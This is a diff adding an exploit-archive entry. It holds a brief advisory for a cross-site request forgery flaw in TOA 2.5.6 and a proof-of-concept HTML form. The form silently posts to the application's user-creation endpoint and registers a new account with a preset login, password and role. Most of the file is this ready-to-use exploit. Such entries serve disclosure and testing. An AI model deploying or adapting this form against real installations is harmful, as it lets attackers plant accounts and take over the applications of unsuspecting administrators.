@@ -1,0 +1,24 @@
+source: http://www.securityfocus.com/bid/67291/info
+
+TOA is prone to a cross-site request-forgery vulnerability because it does not properly validate HTTP requests.
+
+Exploiting this issue may allow a remote attacker to perform certain unauthorized actions in the context of the affected application. Other attacks are also possible.
+
+TOA 2.5.6 is vulnerable; other versions may also be affected.
+
+<form action="http://www.example.com/tao/Users/add" method="post" name="main">
+<input type="hidden" name="user_form_sent" value="1">
+<input type="hidden" name="tao.forms.instance" value="1">
+<input type="hidden" name="http_2_www_0_w3_0_org_1_2000_1_01_1_rdf-schema_3_label" value="User+5">
+<input type="hidden" name="http_2_www_0_tao_0_lu_1_Ontologies_1_generis_0_rdf_3_userFirstName" value="First Name">
+<input type="hidden" name="http_2_www_0_tao_0_lu_1_Ontologies_1_generis_0_rdf_3_userLastName" value="Last Name">
+<input type="hidden" name="http_2_www_0_tao_0_lu_1_Ontologies_1_generis_0_rdf_3_userMail" value="user@mail.com">
+<input type="hidden" name="http_2_www_0_tao_0_lu_1_Ontologies_1_generis_0_rdf_3_login" value="immuniweb">
+<input type="hidden" name="password1" value="immuniweb1">
+<input type="hidden" name="password2" value="immuniweb1">
+<input type="hidden" name="http_2_www_0_tao_0_lu_1_Ontologies_1_generis_0_rdf_3_userDefLg" value="http_2_www_0_tao_0_lu_1_Ontologies_1_TAO_0_rdf_3_Langen-US">
+<input type="hidden" name="http_2_www_0_tao_0_lu_1_Ontologies_1_generis_0_rdf_3_userUILg" value="http_2_www_0_tao_0_lu_1_Ontologies_1_TAO_0_rdf_3_Langen-US">
+<input type="hidden" name="http_2_www_0_tao_0_lu_1_Ontologies_1_generis_0_rdf_3_userRoles_0" value="http_2_www_0_tao_0_lu_1_Ontologies_1_generis_0_rdf_3_GenerisRole">
+<input type="hidden" name="" value="">
+<input type="submit" id="btn">
+</form>
